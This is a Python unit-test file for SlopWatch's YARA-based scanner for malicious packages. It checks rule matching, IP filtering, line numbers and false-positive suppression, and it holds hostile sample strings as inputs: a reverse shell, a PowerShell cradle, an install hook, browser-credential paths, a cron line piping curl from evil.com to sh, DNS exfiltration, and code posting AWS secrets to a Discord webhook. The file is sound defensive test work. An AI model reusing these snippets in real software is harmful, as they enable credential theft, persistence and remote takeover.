"""
Unit tests for SlopWatch's compiled YARA scanning engine (slopwatch.assessor.yara_engine).
Validates rule compilation, pattern matching accuracy, line calculation,
composite heuristics (loaders/stealers), routable IP address filtering,
and exhaustive validation of every single rule against real package code fixtures.
"""

import sys
from pathlib import Path

# Ensure repository root is on sys.path for test fixture imports
REPO_ROOT = Path(__file__).resolve().parents[3]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

import pytest
from slopwatch.assessor.yara_engine import (
    YaraPatternScanner,
    get_yara_scanner,
    is_public_exfil_ip,
)
from tests.fixtures.yara_samples.rule_samples import (
    POSITIVE_RULE_SAMPLES,
    BENIGN_NEGATIVE_SAMPLES,
)


def test_yara_scanner_initialization_and_availability():
    scanner = get_yara_scanner()
    assert scanner.is_available is True
    assert scanner._compiled_rules is not None
    compiled_rules = list(scanner._compiled_rules)
    assert len(compiled_rules) >= 50
    # Every compiled rule must have a corresponding test fixture
    compiled_names = {r.identifier for r in compiled_rules}
    fixture_names = set(POSITIVE_RULE_SAMPLES.keys())
    missing = compiled_names - fixture_names
    assert not missing, f"The following compiled YARA rules lack test fixtures: {missing}"


def test_is_public_exfil_ip_filtering():
    # Public routable IPs must return True
    assert is_public_exfil_ip("185.220.101.5") is True
    assert is_public_exfil_ip("8.8.8.8") is True
    assert is_public_exfil_ip("1.1.1.1") is True

    # RFC-1918 / Local / Loopback IPs must return False
    assert is_public_exfil_ip("127.0.0.1") is False
    assert is_public_exfil_ip("10.0.0.1") is False
    assert is_public_exfil_ip("192.168.1.1") is False
    assert is_public_exfil_ip("172.16.0.1") is False

    # Documentation / Test IPs must return False
    assert is_public_exfil_ip("192.0.2.1") is False    # TEST-NET-1
    assert is_public_exfil_ip("198.51.100.1") is False # TEST-NET-2
    assert is_public_exfil_ip("203.0.113.1") is False  # TEST-NET-3

    # Link-local / Cloud metadata IP must return False
    assert is_public_exfil_ip("169.254.169.254") is False

    # Invalid IP string
    assert is_public_exfil_ip("invalid.ip.address") is False


@pytest.mark.parametrize("rule_name", sorted(list(POSITIVE_RULE_SAMPLES.keys())))
def test_every_yara_rule_matches_positive_sample(rule_name):
    """
    Exhaustive regression test: Every single compiled YARA rule is executed against
    an actual package sample and asserted to trigger successfully.
    """
    scanner = get_yara_scanner()
    content = POSITIVE_RULE_SAMPLES[rule_name]
    ext = ".pth" if "pth" in rule_name.lower() else (".py" if "python" in content.lower() or "import " in content else ".js")
    filename = f"sample_{rule_name.lower()}{ext}"

    flags, lines = scanner.scan_file_content(content, filename)
    assert len(flags) >= 1, f"Rule '{rule_name}' failed to match its positive sample!"
    # Ensure line details were also generated
    assert len(lines) >= 1, f"Rule '{rule_name}' matched but failed to produce line details!"


@pytest.mark.parametrize("sample_name, content", sorted(list(BENIGN_NEGATIVE_SAMPLES.items())))
def test_benign_package_samples_do_not_trigger_false_positives(sample_name, content):
    """
    False-positive prevention: Legitimate open-source package patterns (requests, fastapi, express)
    must NOT trigger any credential theft, exfiltration, or worm propagation signals.
    """
    scanner = get_yara_scanner()
    flags, _ = scanner.scan_file_content(content, sample_name)
    flag_keys = [k for k, _ in flags]

    dangerous_prefixes = [
        "EXFILTRATION_DESTINATION_DETECTED",
        "CREDENTIAL_PATH_HARVESTING",
        "CROSS_ECOSYSTEM_WORM_PROPAGATION",
        "SOURCE_CODE_CONFIRMED_STEALER",
    ]
    for key in flag_keys:
        for dangerous in dangerous_prefixes:
            assert not key.startswith(dangerous), (
                f"Benign sample '{sample_name}' falsely triggered dangerous flag '{key}'!"
            )


def test_yara_new_attack_vector_rules():
    scanner = get_yara_scanner()

    # 1. Reverse shell
    rev_shell = "import socket, os; s=socket.socket(); s.connect(('185.220.101.5', 4444)); os.dup2(s.fileno(), 0)"
    flags, _ = scanner.scan_file_content(rev_shell, "shell.py")
    assert any("Interactive Reverse Shell" in f[0] for f in flags)

    # 2. PowerShell cradle
    ps_cradle = "execSync('powershell.exe -w hidden -enc JABjAGwAYQBzAHMAcABhAHkAbABvAGEAZAA=')"
    flags, _ = scanner.scan_file_content(ps_cradle, "cradle.js")
    assert any("PowerShell Execution Cradle" in f[0] for f in flags)

    # 3. Python setup hook
    py_setup = "class CustomInstall(install):\n    def run(self):\n        install.run(self)\n        os.system('sh payload.sh')\n"
    flags, _ = scanner.scan_file_content(py_setup, "setup.py")
    assert any("Python setup.py Custom Install Hook" in f[0] for f in flags)

    # 4. Browser vaults & Keychain
    browser_db = "const db = path.join(dir, 'Google/Chrome/User Data/Default/Login Data');"
    flags, _ = scanner.scan_file_content(browser_db, "vault.js")
    assert any("Browser Credentials" in f[0] or "Browser Vaults" in f[0] for f in flags)

    # 5. Steganography audio dropper
    telnyx_dropper = "requests.get('http://83.142.209.203/ringtone.wav')\ntarfile.open('payload.tar.gz').extractall()"
    flags, _ = scanner.scan_file_content(telnyx_dropper, "dropper.py")
    assert any("Steganography / Audio Dropper" in f[0] for f in flags)

    # 6. Persistence implant
    persistence = "fs.writeFileSync('~/.config/systemd/user/audiomon.service', serviceData)"
    flags, _ = scanner.scan_file_content(persistence, "implant.js")
    assert any("System Persistence Implant" in f[0] for f in flags)

    # 7. DNS tunneling
    dns_exfil = "dns.resolve(`secret.${data}.oast.fun`)"
    flags, _ = scanner.scan_file_content(dns_exfil, "dns.js")
    assert any("DNS Subdomain Exfiltration" in f[0] for f in flags)


def test_yara_dynamic_code_loader_composite_heuristic():
    scanner = get_yara_scanner()
    content_loader = """
    const b64 = Buffer.from(process.env.PAYLOAD, 'base64').toString();
    eval(b64);
    """
    flags, _ = scanner.scan_file_content(content_loader, "loader.js")
    flag_keys = [k for k, _ in flags]
    assert "SOURCE_CODE_DYNAMIC_CODE_LOADER" in flag_keys

    content_separated = "Buffer.from(x, 'base64');\n" + ("// padding comment\n" * 30) + "eval(safeCode);\n"
    flags_sep, _ = scanner.scan_file_content(content_separated, "separated.js")
    flag_keys_sep = [k for k, _ in flags_sep]
    assert "SOURCE_CODE_DYNAMIC_CODE_LOADER" not in flag_keys_sep


def test_yara_confirmed_stealer_composite_heuristic():
    scanner = get_yara_scanner()
    content = """
    const webhook = "https://discord.com/api/webhooks/999/secret";
    const secret = process.env.AWS_SECRET_ACCESS_KEY;
    fetch(webhook, { method: 'POST', body: secret });
    """
    flags, _ = scanner.scan_file_content(content, "stealer.js")
    flag_keys = [k for k, _ in flags]
    assert "SOURCE_CODE_CONFIRMED_STEALER" in flag_keys
    assert "EXFILTRATION_DESTINATION_DETECTED:Discord Webhook" in flag_keys
    assert "SOURCE_CODE_ENV_VARS_ACCESS:Sensitive Token Harvesting" in flag_keys


def test_yara_line_number_calculation():
    scanner = get_yara_scanner()
    content = "\n\n\nconst token = process.env.NPM_TOKEN;\n"
    flags, lines = scanner.scan_file_content(content, "test.js")

    assert any("found in test.js:4" in text for _, text in flags)
    assert any("test.js:4 ->" in text for _, text in lines)


def test_yara_scanner_missing_rules_graceful_handling():
    scanner = YaraPatternScanner(rules_path="/nonexistent/path/rules.yar")
    assert scanner.is_available is False
    flags, lines = scanner.scan_file_content("eval('test');", "test.js")
    assert flags == []
    assert lines == []


def test_yara_persistent_backdoor_composite_heuristic():
    scanner = get_yara_scanner()
    # Combining shell profile persistence with curl/eval execution
    content = """
    import os
    os.system("echo '* * * * * curl http://evil.com/k | sh' >> /etc/cron.d/backdoor")
    """
    flags, lines = scanner.scan_file_content(content, "backdoor.py")
    flag_keys = [k for k, _ in flags]
    assert "SOURCE_CODE_PERSISTENT_BACKDOOR" in flag_keys
    assert "SYSTEM_PERSISTENCE_TAMPERING:Cron Job Installation / Tampering" in flag_keys


def test_yara_evasive_payload_composite_heuristic():
    scanner = get_yara_scanner()
    # Anti-analysis check combined with payload execution
    content = """
    if (process.env.CI || process.env.GITHUB_ACTIONS) {
        process.exit(0);
    }
    eval(Buffer.from("ZXZpbCgp", "base64").toString());
    """
    flags, lines = scanner.scan_file_content(content, "evasive.js")
    flag_keys = [k for k, _ in flags]
    assert "SOURCE_CODE_EVASIVE_PAYLOAD" in flag_keys
    assert "ANTI_ANALYSIS_EVASION:CI/CD & Sandbox Environment Detection" in flag_keys


def test_python_tarball_yara_integration():
    import tarfile
    import io
    from slopwatch.assessor.python_ast import analyze_python_package_tarball

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        # Create backdoored module with Discord webhook and AWS key
        code = b"""
import os, requests
secret = os.environ.get('AWS_SECRET_ACCESS_KEY')
requests.post('https://discord.com/api/webhooks/12345/abcdef', data=secret)
"""
        ti = tarfile.TarInfo(name="my_pkg/agent.py")
        ti.size = len(code)
        tar.addfile(ti, io.BytesIO(code))

        # Dummy setup.py
        setup_code = b"from setuptools import setup\nsetup(name='my_pkg', version='1.0.0')"
        ti2 = tarfile.TarInfo(name="setup.py")
        ti2.size = len(setup_code)
        tar.addfile(ti2, io.BytesIO(setup_code))

    report = analyze_python_package_tarball(buf.getvalue(), "my_pkg")
    assert any("Discord Webhook" in f for f in report.flags)
    assert any("CONFIRMED_STEALER" in f for f in report.flags)


def test_generated_sdk_banner_suppresses_raw_ip_and_env_noise():
    """A Stainless/OpenAPI-generated client declares its own backend (sometimes a
    raw-IP staging host) and reads os.environ for its api_key — boilerplate, not
    exfiltration. The provenance banner suppresses raw_ip / env categories only."""
    scanner = get_yara_scanner()
    content = (
        "# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.\n"
        "import os\n"
        "ENVIRONMENTS = {\n"
        '    "production": "http://localhost:5001",\n'
        '    "environment_1": "http://3.18.135.213:5001",\n'
        "}\n"
        'api_key = os.environ.get("ACME_SDK_API_KEY")\n'
    )
    flags, _ = scanner.scan_file_content(content, "src/acme_sdk/_client.py")
    keys = [k for k, _ in flags]
    assert not any(k.startswith("EXFILTRATION_DESTINATION_DETECTED") for k in keys)
    assert not any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k in keys)


def test_generated_sdk_banner_does_not_suppress_real_payload():
    """The banner must not become an evasion lever: exec/decode still fire."""
    scanner = get_yara_scanner()
    content = (
        "# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.\n"
        'eval(compile(open(__file__).read(), __file__, "exec"))\n'
    )
    flags, _ = scanner.scan_file_content(content, "src/acme_sdk/_client.py")
    assert any(k.startswith("SOURCE_CODE_DYNAMIC_EXECUTION") for k, _ in flags), (
        "a real dynamic-exec payload must still be flagged inside a generated file"
    )


def test_generated_sdk_archive_hint_covers_verbatim_internal_files():
    """Generators copy internal support files (_models.py, _utils/_logs.py)
    verbatim without a per-file banner — the archive-level hint still suppresses
    their env boilerplate."""
    scanner = get_yara_scanner()
    internal = 'import os\ndefer = os.environ.get("DEFER_PYDANTIC_BUILD", "true")\n'
    with_hint, _ = scanner.scan_file_content(internal, "src/acme_sdk/_models.py", archive_is_generated_sdk=True)
    without_hint, _ = scanner.scan_file_content(internal, "src/acme_sdk/_models.py")
    assert not any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k, _ in with_hint)
    assert any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k, _ in without_hint)


def test_yara_confirmed_stealer_separated_by_distance_does_not_fire():
    """Exfiltration destination and credential access far apart (> 400 chars) must NOT trigger CONFIRMED_STEALER."""
    scanner = get_yara_scanner()
    padding = "\n" + ("# benign utility code line here\n" * 40) + "\n"
    content = f"""
const webhook = "https://discord.com/api/webhooks/999/secret";
{padding}
const secret = process.env.AWS_SECRET_ACCESS_KEY;
"""
    flags, _ = scanner.scan_file_content(content, "scattered_stealer.js")
    flag_keys = [k for k, _ in flags]
    assert "EXFILTRATION_DESTINATION_DETECTED:Discord Webhook" in flag_keys
    assert "SOURCE_CODE_ENV_VARS_ACCESS:Sensitive Token Harvesting" in flag_keys
    assert "SOURCE_CODE_CONFIRMED_STEALER" not in flag_keys


def test_yara_persistent_backdoor_separated_by_distance_does_not_fire():
    """Persistence mechanism and execution primitives far apart (> 400 chars) must NOT trigger PERSISTENT_BACKDOOR."""
    scanner = get_yara_scanner()
    padding = "\n" + ("# benign utility code line here\n" * 40) + "\n"
    content = f"""
with open("/etc/cron.d/backdoor", "w") as f:
    f.write("* * * * * root test\\n")
{padding}
import os
os.system("ls -la /tmp")
"""
    flags, _ = scanner.scan_file_content(content, "scattered_backdoor.py")
    flag_keys = [k for k, _ in flags]
    assert "SYSTEM_PERSISTENCE_TAMPERING:Cron Job Installation / Tampering" in flag_keys
    assert "SOURCE_CODE_PERSISTENT_BACKDOOR" not in flag_keys


def test_yara_evasive_payload_separated_by_distance_does_not_fire():
    """Anti-analysis evasion and payload execution far apart (> 400 chars) must NOT trigger EVASIVE_PAYLOAD."""
    scanner = get_yara_scanner()
    padding = "\n" + ("// benign utility code line here\n" * 40) + "\n"
    content = f"""
if (process.env.CI || process.env.GITHUB_ACTIONS) {{
    process.exit(0);
}}
{padding}
eval("console.log('hello world')");
"""
    flags, _ = scanner.scan_file_content(content, "scattered_evasive.js")
    flag_keys = [k for k, _ in flags]
    assert "ANTI_ANALYSIS_EVASION:CI/CD & Sandbox Environment Detection" in flag_keys
    assert "SOURCE_CODE_EVASIVE_PAYLOAD" not in flag_keys


def test_yara_minified_bundle_suppresses_composite_heuristics():
    """Minified bundle (> 50KB line or mean length > 500) suppresses composite heuristics to avoid false positives."""
    scanner = get_yara_scanner()
    # Create single-line minified code that has webhook, process.env, and eval
    dense_code = "var a=1;function f(){return 'https://discord.com/api/webhooks/999/secret';}var k=process.env.AWS_SECRET_ACCESS_KEY;eval(k);"
    minified_content = dense_code + ("/*pad*/" * 200)  # long single line > 1KB
    flags, _ = scanner.scan_file_content(minified_content, "bundle.min.js")
    flag_keys = [k for k, _ in flags]
    # Specific rule matches still trigger
    assert "EXFILTRATION_DESTINATION_DETECTED:Discord Webhook" in flag_keys
    # But composite heuristics must be suppressed on minified files
    assert "SOURCE_CODE_CONFIRMED_STEALER" not in flag_keys
    assert "SOURCE_CODE_DYNAMIC_CODE_LOADER" not in flag_keys

